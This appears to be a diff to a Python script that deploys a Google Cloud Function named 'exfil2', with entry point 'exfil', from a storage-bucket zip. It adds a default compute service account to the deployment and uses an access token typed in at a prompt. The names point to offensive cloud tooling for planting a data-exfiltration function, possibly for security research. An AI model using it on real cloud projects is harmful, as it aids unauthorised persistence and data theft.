@@ -231,10 +231,11 @@ import google.oauth2.credentials
 
 #------change this--------
 location = "us-east1"
-function_name = "exfil11"
+function_name = "exfil2"
 gsutil_uri = "gs://anirb/function.zip"
 function_entry_point = "exfil"
 project_id="nnnn-374620"
+service_account = "637374802462-compute@developer.gserviceaccount.com"
 #-------------------------
 
 access_token = input('Enter Access Token: ')
@@ -248,6 +249,7 @@ function = CloudFunction(
     source_archive_url="{}".format(gsutil_uri),
     entry_point=function_entry_point,
     runtime="python38",
+    service_account_email=service_account,
     https_trigger={},
 )
 
